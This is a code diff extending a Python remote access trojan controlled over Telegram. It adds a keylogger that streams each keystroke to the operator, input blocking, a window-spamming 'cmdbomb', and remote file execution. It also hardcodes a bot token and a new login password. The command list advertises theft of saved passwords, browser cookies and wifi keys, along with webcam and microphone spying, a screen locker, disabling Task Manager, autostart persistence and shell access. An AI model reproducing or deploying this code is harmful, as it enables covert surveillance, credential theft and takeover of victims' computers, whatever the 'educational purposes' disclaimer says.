@@ -12,69 +12,120 @@ import sqlite3
 import win32crypt
 from Cryptodome.Cipher import AES
 import time
+import stat
 import pyaudio
 import wave
 import browser_cookie3
 import numpy as np
 import shutil
-from datetime import timezone, datetime, timedelta
+from pynput import keyboard
+from datetime import datetime, timedelta
 try:
-    bot = telebot.TeleBot('your_api_token')
+    bot = telebot.TeleBot('6451048923:AAHbUCjxsAhVSzhtV89U_Wl5Pm2V-YkAfLk')
 except Exception as e:
     pass
 #################################################################################
-textovik = """You can use:
-        ⚔️/start - start the program
-        ⚙️/help - help with commands
-        🔌/addstartup - to add autostart
-        🧑🏻‍💻/users - show users in pc
-        🔑/passwords - show saved passwords in pc
-        🍪/robloxcookie - show roblox cookies
-        🪪/info - to show information about pc ,also location , country, city , ip
-        🖥️/whoami - to show name of pc
-        💬👂🏻/textspech 'your text' - your text will sounded in pc
-        🎵/playsound 'file path' -(first run /upload to upload your music file in pc) your file will sound in pc for ex: /playsound C:\\test.mp3
-        🔫/execute - execute shell commands (like terminel emulator in netcat)
-        🗡️/e 'your command' - also execute shell commands
-        🏹/ex 'your command' - use this if you will execute commands with long response 
-        📷/screenshot - to get screenshot
-        📹/webscreen - get screenshot from camera
-        🎙️/mic 'time in seconds' - record microphone of pc
-        ☢️/winblocker - my own winlocker
-        ☣️/winblocker2 - if winblocker doesnt work
-        📁/download 'your file' - to download files(for exm: /download C:\\test.txt)
-        🗃️/upload - to upload file in target pc
-        📋/clipboard - show users clipboard
-        🎦/webcam - get webcam video
-        🎥/screenrecord - get screenrecord
-        🌐/chrome 'website url' - open website in chrome in target pc
-        🌐/edge 'website url' - open website in edge in target pc
-        🌐/firefox 'website url' - open website in firefox in target pc             
-        Ⓜ️/msg 'your message' - send message(messagebox) to target
-        💣/spam 'your message' - spam your message 10 times but if you will click al lot...
-        🛜/wifilist - show saved wifi
-        🔐/wifipass 'name of accespoint' - show password of saved wifi
-        🖱️/mousemesstart - start mouse messing
-        🐁/mousemesstop - stop mouse messing
-        🪤/mousekill - disable mouse
-        🐭/mousestop - enable mouse
-        🔊/fullvolume - make full volume
-        🔉/volumeplus - make pc volume + 10
-        🔇/volumeminus - make pc volume - 10
-        🪦/disabletaskmgr - disable task manager
-        📠/enabletaskmgr - enable task manager
-        🧱/wallpaper - change desktop's wallpaper
-        ⌨️/keypress 'your key' - in pc's keyboard will pressed this keys 
-        ⌨️/keypresstwo 'your key' 'your key' - in pc's keyboard will pressed this keys 
-        ⌨️/keypresstthree 'your key' 'your key' 'your key' - in pc's keyboard will pressed this keys 
-        📃/tasklist - to show tasks
-        🧨/taskkill 'your task' - kill entered task
-        🕶️/hide - to hide your app
-        👓/unhide - unhide your app
-        💤/sleep - send windows to sleep
-        🕚/shutdown - shutdown pc
-        🔄️/restart - restart pc
-        """
+textovik = """
+## **🛠️ System Commands**
+- ⚙️ **/start** - Start the program
+- ⚙️ **/help** - Help with commands
+- 🔌 **/addstartup** - Add autostart
+- ⌨️ **/keylogger** - Start keylogger
+- ⛔ **/stopkeylogger** - Stop keylogger
+- 👟 **/run [filepath]** - Run file
+- 🧑🏻‍💻 **/users** - Show users on the PC
+- 🖥️ **/whoami** - Show the name of the PC
+- 📃 **/tasklist** - Show running tasks
+- 🧨 **/taskkill [task]** - Kill the entered task
+- 💤 **/sleep** - Put the PC to sleep
+- 🕚 **/shutdown** - Shutdown the PC
+- 🔄 **/restart** - Restart the PC
+- 💥 **/altf4** - ALT + F4 (google it to find what it means)
+- 💣 **/cmdbomb** - Opens 10 CMD windows
+- Ⓜ️ **/msg [type] [title] [text]** - Displays a messagebox
+*/msg types(info; warning; error; question; default or 0)*
+** for ex: /msg error testtitle testtext **
+
+## **🔒 Security & Privacy**
+- 🔑 **/passwords** - Show saved passwords on the PC
+- 🍪 **/robloxcookie** - Show Roblox cookies
+- 🧱 **/wallpaper** - Change the desktop wallpaper
+- 🪦 **/disabletaskmgr** - Disable Task Manager
+- 📠 **/enabletaskmgr** - Enable Task Manager
+- ☢️ **/winblocker** - My own winlocker
+- ☣️ **/winblocker2** - If winblocker doesn't work
+
+## **📱 Device Management**
+- 📷 **/screenshot** - Take a screenshot
+- 🎙️ **/mic [time in seconds]** - Record the PC's microphone
+- 📹 **/webscreen** - Get a screenshot from the camera
+- 🎦 **/webcam** - Get webcam video
+- 🎥 **/screenrecord** - Record the screen
+- 🚫 **/block** - Block user input (mouse and keyboard)
+- ✅ **/unblock** - Unblock user input (mouse and keyboard)
+- 🖱️ **/mousemesstart** - Start mouse messing
+- 🐁 **/mousemesstop** - Stop mouse messing
+- 🪤 **/mousekill** - Disable the mouse
+- 🐭 **/mousestop** - Enable the mouse
+- 🖱️ **/mousemove [x] [y]** - Enter x and y cordinates and mouse's pointer goes there
+- 🐁 **/mouseclick** - Make click with mouse
+- 🔊 **/fullvolume** - Set volume to full
+- 🔉 **/volumeplus** - Increase volume by 10
+- 🔇 **/volumeminus** - Decrease volume by 10
+- 🔄️ **/rotate** - Rotate monitor +90 degrees (for exmpl: entering 2 times rotates it 180 degrees)
+- 🪟 **/maximize** - Maximize active window
+- 🪟 **/minimize** - Minimize active window
+
+## **🌐 Networking**
+- 🛜 **/wifilist** - Show saved Wi-Fi networks
+- 🔐 **/wifipass [accesspoint]** - Show the password of a saved Wi-Fi network
+- 🌐 **/chrome [website URL]** - Open a website in Chrome
+- 🌐 **/edge [website URL]** - Open a website in Edge
+- 🌐 **/firefox [website URL]** - Open a website in Firefox
+
+## **🎶 Multimedia**
+- 💬👂🏻 **/textspech [your text]** - Speak the text aloud
+- 🎵 **/playsound [file path]** - Play a sound file (first upload the file using **/upload**)
+- 📁 **/download [file path]** - Download a file from the PC
+- 🗃️ **/upload** - Upload a file to the PC
+- 📋 **/clipboard** - Show clipboard content
+- 📇 **/changeclipboard [testcahnge]** - Change clipboard content
+
+## **⚙️ Advanced Operations**
+- 🗡️ **/e [command]** - Execute shell commands (shortcut)
+- 🏹 **/ex [command]** - Execute shell commands with long responses
+- 🔫 **/execute** - Execute shell commands my alternative of netcat in linux (works commands such as cd ,cd.. and etc...)
+- *commands like cd ,cd .. and others work excellent in the /e ,  /ex and /execute commands.*
+- 📅 **/metadata [filepath]** - Displays the file's metadata information
+- ⌨️ **/keytype [key]** - Enter a text and that text will written with pc's keyboard
+- ⌨️ **/keypress [key]** - Press a specific key on the keyboard
+- ⌨️ **/keypresstwo [key1] [key2]** - Press two keys simultaneously
+- ⌨️ **/keypressthree [key1] [key2] [key3]** - Press three keys simultaneously
+- 🕶️ **/hide** - Hide your app
+- 👓 **/unhide** - Unhide your app
+
+## **🖥️ System Information**
+- 🪪 **/info** - Show PC information (IP, location, country, city)
+- 📊 **/pcinfo** - Info about PC's OS, system, CPU, Windows version, BIOS, etc...
+- 💻 **/shortinfo** - Show's less but, mostly the necessary information about pc
+- 🛠️ **/apps** - Show installed apps on the PC
+- 🔋 **/batteryinfo** - Show info about battery 
+
+## **EXAMPLES:**
+- 📖 **/examples** - Shows examples
+
+## **📱🤳🏻My Socials:🌐📲**
+- 🔗 **/github** - [**My github**]
+"""
+examplestext = """
+## **Examples:**
+- **/e whoami** → **Output**: win-9bn5tk4e2b7\\user
+- **/e cd /home** → **Output**: You are in: home
+- **/run C:\\Users\\user\\Pictures\\test.png** → **Output**: File opened successfully!
+- **/mousemove 50 80 ** → **Output**: Mouse pointer moved to {x} and {y} cordinates successfully!
+- **/keypress x ** → **Output**: \'x\' key has pressed successfully!
+- **/msg info testtitle testtexthi** → **Output**: Successfully displayed! 
+"""
 n = False
 
 @bot.message_handler(commands=['start'])
@@ -90,22 +141,28 @@ def start(message):
                 bot.send_message(message.chat.id, f'Salam aleykum, {message.from_user.first_name}! I promise you will use this only for educational purposes :)')
             else:
                 bot.send_message(message.chat.id, f'Salam aleykum ,{message.from_user.first_name} {message.from_user.last_name}! I promise you will use this only for educational purposes :)')
+            bot.send_message(message.chat.id, '❗I am not responsible for your actions❕')
             result = os.popen('whoami').read().strip()
             bot.send_message(message.chat.id, f'You can use /help')
-            bot.send_message(message.chat.id, f'Pc name is: {result}')
+            bot.send_message(message.chat.id, f'Pc\'s name is: {result}')
+            bot.send_message(message.chat.id, '🔗My GitHub page: [**GitHub - WhiteeRabbit**](https://github.com/WhiteeRabbit)')
+
 def checkpass(message):
-        if message.text == 'acd':
+        if message.text == 'MomentoMori':
             global n
             n = True
-            bot.send_message(message.chat.id, 'Logged succesfuly!')
+            bot.send_message(message.chat.id, 'Logged successfully!')
             bot.send_message(message.chat.id, "Connection!")
             if message.from_user.last_name == None:
                 bot.send_message(message.chat.id, f'Salam aleykum, {message.from_user.first_name}! I promise you will use this only for educational purposes :)')
             else:
                 bot.send_message(message.chat.id, f'Salam aleykum ,{message.from_user.first_name} {message.from_user.last_name}! I promise you will use this only for educational purposes :)')
+            bot.send_message(message.chat.id, '❗I am not responsible for your actions❕')
             result = os.popen('whoami').read().strip()
             bot.send_message(message.chat.id, f'You can use /help')
             bot.send_message(message.chat.id, f'Pc name is: {result}')
+            bot.send_message(message.chat.id, '🔗My GitHub page: [**GitHub - WhiteeRabbit**](https://github.com/WhiteeRabbit)')
+
         else:
             bot.send_message(message.chat.id, 'password is wrong')
 #################################################################################    
@@ -363,12 +420,66 @@ def task_kill(message):
         ss = os.popen(f'taskkill /f /im {task}').read().strip()
         bot.send_message(message.chat.id , f'{ss}')
     except Exception as e:
-        bot.send_message(message.chat.id, f'Error:{e}')
-
-
+        bot.send_message(message.chat.id, f'Error: {e}')
 #############################################################################
 
+@bot.message_handler(commands=['msg'])
+def show_message_box(message):
+    try:
+        keypwo = message.text.split('/msg', 1)[1].strip().split()
+        msg_type = keypwo[0]
+        title = keypwo[1]
+        text = keypwo[2]
+        
+        types = {
+            "info": 64,     
+            "warning": 48,
+            "error": 16,
+            "question": 32,
+            "default": 0
+        }
+        msg_type = types.get(msg_type, 0)  
+        
 
+        command = f'mshta vbscript:Execute("msgbox ""{text}"", {msg_type}, ""{title}"":close")'
+        bot.send_message(message.chat.id, "Successfully displayed!")
+        os.popen(command)
+    except Exception as e:
+        bot.send_message(message.chat.id, f'Error:{e}')
+#############################################################################
+
+@bot.message_handler(commands=['stopkeylogger'])
+def stop_key(message):
+    global end
+    end = 1    
+    bot.send_message(message.chat.id, "Keylogger stopped!")
+    
+#############################################################################
+@bot.message_handler(commands=['keylogger'])
+def track_all_keys(message):
+    try:
+        bot.send_message(message.chat.id, "Keylogger started!")
+        bot.send_message(message.chat.id, "Run: /stopkeylogger to stop")
+        global end
+        end = 0
+        def on_press(key):
+
+            try:
+                bot.send_message(message.chat.id, f"Pressed key: {key.char}")
+            except AttributeError:
+                bot.send_message(message.chat.id, f"Special key pressed: {key}")
+
+        def on_release(key):
+
+            if end == 1:
+                bot.send_message(message.chat.id, "Keylogger stopped!")
+                return False
+
+        with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
+            listener.join()
+    except Exception as e:
+        bot.send_message(message.chat.id, f'Error:{e}')
+#############################################################################
 @bot.message_handler(commands=['clipboard'])
 def get_clipboard_content(message):
     usid = message.from_user.id
@@ -392,7 +503,7 @@ def get_clipboard_content(message):
             body = value.decode()
             user32.CloseClipboard()
             username = os.getlogin()
-            bot.send_message(message.chat.id , f'{username} \'s clipboard is : {body}')
+            bot.send_message(message.chat.id , f'{username} \'s clipboard is:  {body}')
 
 
 #############################################################################s
@@ -456,6 +567,50 @@ def mous(message):
 
 #############################################################################
 
+@bot.message_handler(commands=['keytype'])
+def keytyp(message):
+    try:
+        
+        text = message.text.split('/keytype' , 1)[1].strip()
+        
+        pyautogui.write(text)
+
+    except Exception as e:
+        bot.send_message(message.chat.id , f'Error{e}')
+
+
+
+###################################################################
+
+@bot.message_handler(commands=['mousemove'])
+def mousemove(message):
+    try:
+        cordinates = message.text.split('/mousemove', 1)[1].strip().split()
+        x = int(cordinates[0])
+        y = int(cordinates[1])
+        
+        pyautogui.moveTo(x, y)
+    
+        bot.send_message(message.chat.id , f'Mouse pointer moved to {x} and {y} cordinates successfully!')
+    
+    except Exception as e:
+        bot.send_message(message.chat.id , f'Error{e}')
+        
+        
+###################################################################
+
+@bot.message_handler(commands=['mouseclick'])
+def mousemove(message):
+    try:
+        
+        pyautogui.click()
+
+        bot.send_message(message.chat.id , 'Mouse clicked!')
+    
+    except Exception as e:
+        bot.send_message(message.chat.id , f'Error{e}')
+#############################################################################
+
 @bot.message_handler(commands=['keypress'])
 def keyprs(message):
  
@@ -489,7 +644,7 @@ def keyprs(message):
 
         keypr = message.text.split('/keypress', 1)[1].strip()
         pyautogui.press(keypr) 
-        bot.send_message(message.chat.id , f'\'{keypr}\'  key has pressed succesfuly!')
+        bot.send_message(message.chat.id , f'\'{keypr}\'  key has pressed successfully!')
     except Exception as e:
         bot.send_message(message.chat.id , f"Error: {e}")  
 
@@ -536,7 +691,7 @@ def keyprs(message):
         key2 = keypwo[1]
 
         pyautogui.hotkey(key1, key2)
-        bot.send_message(message.chat.id , f'key has pressed succesfuly!')
+        bot.send_message(message.chat.id , f'key has pressed successfully!')
     except Exception as e:
         bot.send_message(message.chat.id , f"Error: {e}")  
         
@@ -582,14 +737,161 @@ def keyprs(message):
 
     
         pyautogui.hotkey(key1, key2 , key3)
-        bot.send_message(message.chat.id , f'key has pressed succesfuly!')
+        bot.send_message(message.chat.id , f'key has pressed successfully!')
     except Exception as e:
         bot.send_message(message.chat.id , f"Error: {e}")  
+
+#############################################################################
+@bot.message_handler(commands=['apps'])
+def apps(message):
+    try:
+        res = os.popen('wmic product get Name, Version , Vendor').read().strip()
         
+        lines = res.splitlines()
+        
+        chunk_size = 30
+        chunks = [lines[i:i + chunk_size] for i in range(0, len(lines), chunk_size)]
+     
+        for chunk in chunks:
+            bot.send_message(message.chat.id, "\n".join(chunk).strip())
+
+    except Exception as e:
+        bot.send_message(message.chat.id, f"Error: {e}")
         
 #############################################################################
+@bot.message_handler(commands=['pcinfo'])
+def pcinfo(message):
+    try: 
+        # prop = os.popen('wmic computersystem list brief').read().strip()
+        # ver = os.popen('wmic computersystem list brief').read().strip()
+        # bios = os.popen('wmic bios get Manufacturer, Version, ReleaseDate, SerialNumber, SMBIOSBIOSVersion').read().strip()
+        # cpu = os.popen('wmic cpu get Name, NumberOfCores, NumberOfLogicalProcessors, MaxClockSpeed, Manufacturer, Caption').read().strip()
+        # ram = os.popen('wmic memorychip get Capacity, Manufacturer, MemoryType, Speed, PartNumber, DeviceLocator').read().strip()
+        # diskdrive = os.popen('wmic diskdrive get Model, Size, SerialNumber, MediaType, InterfaceType, Status').read().strip()
+        # osinfo = os.popen('wmic os get Caption, Version, OSArchitecture, BuildNumber, RegisteredUser, SerialNumber, InstallDate').read().strip()
+        # networkadapter = os.popen('wmic nicconfig get Description, MACAddress, IPAddress, DefaultIPGateway, DNSHostName, ServiceName').read().strip()
+        # bot.send_message(message.chat.id , f"pc properties: {prop}")
+        # bot.send_message(message.chat.id , f"pc's os version: {ver}")
+        # bot.send_message(message.chat.id , f"pc bios: {bios}")
+        # bot.send_message(message.chat.id , f"cpu: {cpu}")
+        # bot.send_message(message.chat.id , f"ram: {ram}")
+        # bot.send_message(message.chat.id , f"diskdrive: {diskdrive}")
+        # bot.send_message(message.chat.id , f"os: {osinfo}")
+        # bot.send_message(message.chat.id , f"network adapter: {networkadapter}")    
 
+        prop = os.popen('wmic computersystem list brief').read().strip()
+        ver = os.popen('wmic computersystem list brief').read().strip()
+        bios = os.popen('wmic bios get Manufacturer, Version, ReleaseDate, SerialNumber, SMBIOSBIOSVersion').read().strip()
+        cpu = os.popen('wmic cpu get Name, NumberOfCores, NumberOfLogicalProcessors, MaxClockSpeed, Manufacturer, Caption').read().strip()
+        ram = os.popen('wmic memorychip get Capacity, Manufacturer, MemoryType, Speed, PartNumber, DeviceLocator').read().strip()
+        diskdrive = os.popen('wmic diskdrive get Model, Size, SerialNumber, MediaType, InterfaceType, Status').read().strip()
+        compsysinfo = os.popen('wmic computersystem get Model, Manufacturer, TotalPhysicalMemory, Domain, Username, SystemType, NumberOfProcessors').read().strip()
+        osinfo = os.popen('wmic os get Caption, Version, OSArchitecture, BuildNumber, RegisteredUser, SerialNumber, InstallDate').read().strip()
+        networkadapter = os.popen('wmic nicconfig get Description, MACAddress, IPAddress, DefaultIPGateway, DNSHostName, ServiceName').read().strip()
+        minios = os.popen('wmic os get /format:list').read().strip()
+
+        def send_long_message(chat_id, title, content):
+            lines = content.splitlines()
+            chunk_size = 30  
+            chunks = [lines[i:i + chunk_size] for i in range(0, len(lines), chunk_size)]
+            
+            for idx, chunk in enumerate(chunks):
+                bot.send_message(chat_id, f"{title} (part {idx + 1}):\n" + "\n".join(chunk))
+        send_long_message(message.chat.id, "PC Properties", prop)
+        send_long_message(message.chat.id, "PC OS Version", ver)
+        send_long_message(message.chat.id, "PC BIOS", bios)
+        send_long_message(message.chat.id, "CPU Info", cpu)
+        send_long_message(message.chat.id, "RAM Info", ram)
+        send_long_message(message.chat.id, "Computer Info" , compsysinfo)
+        send_long_message(message.chat.id, "Disk Drive Info", diskdrive)
+        send_long_message(message.chat.id, "OS Info", osinfo)
+        send_long_message(message.chat.id, "Network Adapter Info", networkadapter)
+        bot.send_message(message.chat.id, f"System Info: {minios}")
+
+
+    except Exception as e:
+        bot.send_message(message.chat.id , f"Error: {e}")  
                 
+                
+#################################################################################
+@bot.message_handler(commands=['batteryinfo'])
+def batteryinfo(message):
+    try:
+        # wmic path Win32_Battery get EstimatedChargeRemaining, BatteryStatus, FullChargeCapacity,Status
+        batstatus = os.popen('wmic path Win32_Battery get BatteryStatus').read().strip()
+        bates = os.popen('wmic path Win32_Battery get EstimatedChargeRemaining').read().strip()
+        batname = os.popen('wmic path Win32_Battery get name').read().strip()
+        batsysname = os.popen('wmic path Win32_Battery get SystemName').read().strip()
+        bot.send_message(message.chat.id, '''In BatteryStatus. each number represents a specific battery state.
+                                Here are the meanings:
+                         
+                         1 - The battery is discharging
+                         2 - The battery is charging
+                         3 - The battery is fully charged
+                         4 - The battery charge is low
+                         5 - The battery charge is critical
+                         6 - The battery is charging and will soon be fully.
+                         7 - Charge is zero''')
+
+        bot.send_message(message.chat.id, f'Battery status: {batstatus}')
+        bot.send_message(message.chat.id, f'Battery System name: {batsysname}')
+        bot.send_message(message.chat.id, f'Battery name: {batname}')
+        bot.send_message(message.chat.id, f'Battery {bates}%')
+    except Exception as e:
+        bot.send_message(message.chat.id , f"Error: {e}")
+#############################################################################
+
+@bot.message_handler(commands=['shortinfo'])
+def shortpcinfo(message):
+    try:
+        bot.send_message(message.chat.id , 'Please wait...')
+        host_name = os.getenv('COMPUTERNAME', 'Unknown')
+
+        os_name = os.popen('ver').read().strip()
+        
+        try:
+            os_version = os.popen('wmic os get version').read().splitlines()[2].strip()
+        except IndexError:
+            os_version = 'Unknown'
+
+        try:
+            processor_info = os.popen('wmic cpu get Name').read().splitlines()[2].strip()
+        except IndexError:
+            processor_info = 'Unknown'
+
+        cores = os.cpu_count()
+
+        if os.name == 'nt':
+            total_ram = os.popen('wmic computersystem get TotalPhysicalMemory').read().splitlines()[2].strip()
+            total_ram = f"{int(total_ram) // (1024 ** 2)} MB" if total_ram.isdigit() else "Not available"
+        else:
+            total_ram = "Not available"
+
+        boot_time_str = os.popen('systeminfo | find "System Boot Time"').read().strip()
+        if boot_time_str:
+            boot_time = boot_time_str.split(":")[1].strip()
+        else:
+            boot_time = "Not available"
+
+        info = {
+            "System": os_name,
+            "Host name": host_name,
+            "OS version": os_version,
+            "CPU": processor_info,
+            "Core count": cores,
+            "RAM": total_ram,
+            "Boot time": boot_time
+        }
+
+        info_text = "\n".join([f"{key}: {value}" for key, value in info.items()])
+
+
+        bot.send_message(message.chat.id, info_text)
+
+    except Exception as e:
+        bot.send_message(message.chat.id, f"Error: {e}")
+
+#############################################################################
 @bot.message_handler(commands=['disabletaskmgr'])
 def disabtsk(message):       
     try:
@@ -602,8 +904,24 @@ def disabtsk(message):
                
         
 #############################################################################
+@bot.message_handler(commands=['block'])
+def block(message):
+    try:
+        ctypes.windll.user32.BlockInput(True)
+        bot.send_message(message.chat.id , 'User\'s input (mouse and keyboard) successfully blocked!')
 
-                
+    except Exception as e:
+        bot.send_message(message.chat.id , f"Error: {e}")
+#############################################################################
+@bot.message_handler(commands=['unblock'])
+def unblock(message):
+    try:
+        ctypes.windll.user32.BlockInput(False)
+        bot.send_message(message.chat.id , 'User\'s input (mouse and keyboard) successfully unblocked!')
+        bot.send_message(message.chat.id , 'If it\'s not unblocked run again: \n/unblock')
+    except Exception as e:
+        bot.send_message(message.chat.id , f"Error: {e}")
+#############################################################################
 @bot.message_handler(commands=['enabletaskmgr'])
 def disabtsk(message):       
     try:
@@ -634,23 +952,75 @@ def wifipassword(message):
     except Exception as e:
         bot.send_message(message.chat.id , f"Error: {e}")
 
+#############################################################################
+
+
+@bot.message_handler(commands=['rotate'])
+def rotate(message):
+    angle = 0
+    angle = (angle + 90) % 360 
+        
+    
+    pyautogui.hotkey('ctrl', 'alt', {0: 'up', 90: 'right', 180: 'down', 270: 'left'}[angle])
+    bot.send_message(message.chat.id,f"rotated +{angle} degrees")
+
+
+
+
+
+
 
 #############################################################################      
+
+# @bot.message_handler(commands=['users'])
+
+# def users(message):
+    
+#     try:
+#         com = os.popen('net user').read().strip()
+#         bot.send_message(message.chat.id, f'Res:{com}')
+ 
+#         bot.send_message(message.chat.id, '####################################')
+        
+#         cm = os.popen('wmic useraccount list brief').read().strip()
+#         bot.send_message(message.chat.id, f'Also:{cm}')
+    
+#     except Exception as e:
+#         bot.send_message(message.chat.id, f'Error:{e}')
 @bot.message_handler(commands=['users'])
 def users(message):
-    
     try:
-        com = os.popen('net user').read().strip()
-        bot.send_message(message.chat.id, f'Res:{com}')
- 
+        com_raw = os.popen('net user').read().strip()
+        com_lines = com_raw.splitlines()
+        com_output = "\n".join(com_lines)
+        
+        bot.send_message(message.chat.id, f'Res:\n{com_output}')
         bot.send_message(message.chat.id, '####################################')
         
-        cm = os.popen('wmic useraccount list brief').read().strip()
-        bot.send_message(message.chat.id, f'Also:{cm}')
+        cm_raw = os.popen('wmic useraccount list brief').read().strip()
+        cm_lines = cm_raw.splitlines()
+        
+        headers = cm_lines[0].split()
+        data_rows = [line.split(maxsplit=len(headers)-1) for line in cm_lines[1:]]
+
+        col_widths = [len(header) for header in headers]
+        for row in data_rows:
+            for i, item in enumerate(row):
+                col_widths[i] = max(col_widths[i], len(item))
+        
+        def format_row(row):
+            return " | ".join(item.ljust(col_widths[i]) for i, item in enumerate(row))
+        
+        header_row = format_row(headers)
+        separator = "-+-".join("-" * width for width in col_widths)
+        
+        table = [header_row, separator] + [format_row(row) for row in data_rows]
+        formatted_cm_output = "\n".join(table)
+        
+        bot.send_message(message.chat.id, f'Also:\n{formatted_cm_output}')
     
     except Exception as e:
-        bot.send_message(message.chat.id, f'Error:{e}')
-
+        bot.send_message(message.chat.id, f'Error: {e}')
 #############################################################################      
 @bot.message_handler(commands=['hide'])
 def hide(message):
@@ -741,31 +1111,72 @@ def record_audio(message):
         bot.send_audio(message.chat.id, audio_file)
 
     os.remove(WAVE_OUTPUT_FILENAME)
-
-###################################################################
-@bot.message_handler(commands=['msg'])
-def msg(message):
-    try:
-        mesaj = message.text.split('/msg', 1)[1].strip()
-        os.popen(f'msg * {mesaj}')
-    except Exception as e:
-        bot.send_message(message.chat.id , f'Error{e}')
     
-#############################################################################
-@bot.message_handler(commands=['spam'])
-def msg(message):
-    mesaj = message.text.split('/spam', 1)[1].strip()
+@bot.message_handler(commands=['metadata'])
+def get_metadata(message):
+    filepath = message.text.split('/metadata', 1)[1].strip()
+
+    if not os.path.exists(filepath):
+        bot.send_message(message.chat.id, "Error: File does not exist")
+        return
+
     try:
-        n = 0
-        while n != 10:
-            n = n + 1
-            os.popen(f'msg * {mesaj}')
+        statObject = os.stat(filepath)
+        
+        modificationTime = time.ctime(statObject[stat.ST_MTIME])
+        
+        sizeInMegaBytes = statObject[stat.ST_SIZE] / 1048576  
+        sizeInMegaBytes = round(sizeInMegaBytes, 2)
+        
+        lastAccessTime = time.ctime(statObject[stat.ST_ATIME])
+        
+        fileMetadata = f"Last modified: {modificationTime}\n"
+        fileMetadata += f"Size in MB: {sizeInMegaBytes} MB\n"
+        fileMetadata += f"Last accessed: {lastAccessTime}\n"
+        
+        bot.send_message(message.chat.id, fileMetadata)
+    
     except Exception as e:
-        bot.send_message(message.chat.id , f'Error{e}')
+        bot.send_message(message.chat.id, f"Error: {str(e)}")
+###################################################################
+
+@bot.message_handler(commands=['minimize'])
+def minimize(message): 
+    try:
+        pyautogui.hotkey("win", "down")  
+        bot.send_message(message.chat.id, "The active window has been minimized!")
+        bot.send_message(message.chat.id, "Type the command again to minimize the window to the taskbar.")
+    except Exception as e:
+        bot.send_message(message.chat.id, f"Error: {e}")
+
+@bot.message_handler(commands=['maximize'])
+def maximize(message): 
+    try:
+        pyautogui.hotkey("win", "up")
+        bot.send_message(message.chat.id, "The active window has been maximized!")
+    except Exception as e:
+        bot.send_message(message.chat.id, f"Error: {e}")
+      
+#################################################################################
+        
+@bot.message_handler(commands=['github'])
+def github(message): 
+    bot.send_message(message.chat.id, 'My github:')
+    bot.send_message(message.chat.id, '[**GitHub - WhiteeRabbit**](https://github.com/WhiteeRabbit)')
+
 
 #############################################################################
+@bot.message_handler(commands=['cmdbomb'])
+def cmdbomb(message):
+    try:
 
+        os.popen('start cmd && start cmd && start cmd && start cmd && start cmd && start cmd && start cmd && start cmd && start cmd && start cmd')
+        bot.send_message(message.chat.id, 'Opened 10 CMD windows!')
+    except Exception as e:
+        bot.send_message(message.chat.id , f'Error: {e}')
+        
 
+#############################################################################
    
 waiting_for_upload = False     
 
@@ -796,6 +1207,40 @@ def handle_file(message):
 
 #############################################################################
 
+@bot.message_handler(commands=['altf4'])
+def altf(message):
+    try:
+        pyautogui.hotkey('alt' , 'f4')
+        bot.send_message(message.chat.id , 'ALT + F4 was pressed successfully')
+    except Exception as e:
+        bot.send_message(message.chat.id , f'Error: {e}') 
+#############################################################################
+@bot.message_handler(commands=['run'])
+def startfile(message):
+    try:
+        file = message.text.split('/run' , 1)[1].strip()
+        os.popen(f'start {str(file)}')
+        bot.send_message(message.chat.id, 'File opened successfully!')
+    except Exception as e:
+        bot.send_message(message.chat.id , f'Error:{e}') 
+
+#############################################################################
+
+@bot.message_handler(commands=['changeclipboard'])
+def chgclip(message):
+    try:
+        text = message.text.split('/changeclipboard' , 1)[1].strip()
+        
+        command = 'echo | set /p nul=' + text.strip() + '| clip'
+        os.system(command)
+        bot.send_message(message.chat.id,f'Clipboard was changed to \"{text}\" successfully!') 
+    except Exception as e:
+        bot.send_message(message.chat.id , f'Error: {e}') 
+
+
+
+
+#############################################################################
 @bot.message_handler(commands=['wallpaper'])
 def wallpaper(message):
     
@@ -810,7 +1255,7 @@ def wall(message):
     if not filename.startswith('/'):
         try:
             ctypes.windll.user32.SystemParametersInfoW(20, 0, os.path.abspath(str(filename)), 0)
-            bot.send_message(message.chat.id, "Desktop's wallpaper succesfuly changed!")
+            bot.send_message(message.chat.id, "Desktop's wallpaper successfully changed!")
     
         except Exception as e:
             bot.send_message(message.chat.id, f'Error{e}')
@@ -843,48 +1288,13 @@ def download_file(message):
 
 def volp(message):
     try:
-        pyautogui.press('volumeup')
-        pyautogui.press('volumeup')
-        pyautogui.press('volumeup')
-        pyautogui.press('volumeup')
-        pyautogui.press('volumeup')
-        pyautogui.press('volumeup')
-        pyautogui.press('volumeup')
-        pyautogui.press('volumeup')
-        pyautogui.press('volumeup')
-        pyautogui.press('volumeup')
-        pyautogui.press('volumeup')
-        pyautogui.press('volumeup')
-        pyautogui.press('volumeup')
-        pyautogui.press('volumeup')
-        pyautogui.press('volumeup')
-        pyautogui.press('volumeup')
-        pyautogui.press('volumeup')
-        pyautogui.press('volumeup')
-        pyautogui.press('volumeup')
-        pyautogui.press('volumeup')
-        pyautogui.press('volumeup')
-        pyautogui.press('volumeup')
-        pyautogui.press('volumeup')
-        pyautogui.press('volumeup')
-        pyautogui.press('volumeup')
-        pyautogui.press('volumeup')
-        pyautogui.press('volumeup')
-        pyautogui.press('volumeup')
-        pyautogui.press('volumeup')
-        pyautogui.press('volumeup')
-        pyautogui.press('volumeup')
-        pyautogui.press('volumeup')
-        pyautogui.press('volumeup')
-        pyautogui.press('volumeup')
-        pyautogui.press('volumeup')
-        pyautogui.press('volumeup')
-        pyautogui.press('volumeup')
-        pyautogui.press('volumeup')
-        pyautogui.press('volumeup')
-        pyautogui.press('volumeup')
-        pyautogui.press('volumeup')
-        bot.send_message(message.chat.id, 'succesfuly full!')
+        n = 0
+        while n < 70:
+            pyautogui.press('volumeup')
+            n += 1
+        
+
+        bot.send_message(message.chat.id, 'successfully full!')
     except Exception as e:
         bot.send_message(message.chat.id, f'Error{e}')
 #############################################################################
@@ -897,7 +1307,7 @@ def volp(message):
         pyautogui.press('volumeup')
         pyautogui.press('volumeup')
         pyautogui.press('volumeup')
-        bot.send_message(message.chat.id, 'succesfuly +10')
+        bot.send_message(message.chat.id, 'successfully +10')
     except Exception as e:
         bot.send_message(message.chat.id, f'Error{e}')
 #############################################################################
@@ -910,7 +1320,7 @@ def volm(message):
         pyautogui.press('volumedown')
         pyautogui.press('volumedown')
         pyautogui.press('volumedown')
-        bot.send_message(message.chat.id, 'succesfuly -10')
+        bot.send_message(message.chat.id, 'successfully -10')
     except Exception as e:
         bot.send_message(message.chat.id, f'Error{e}')
 #############################################################################
@@ -965,13 +1375,20 @@ def help(message):
     else:
         bot.send_message(message.chat.id,textovik)
 def checkpasswd(message):
-    if message.text == 'acd':
+    if message.text == 'MomentoMori':
         global n
         n = True
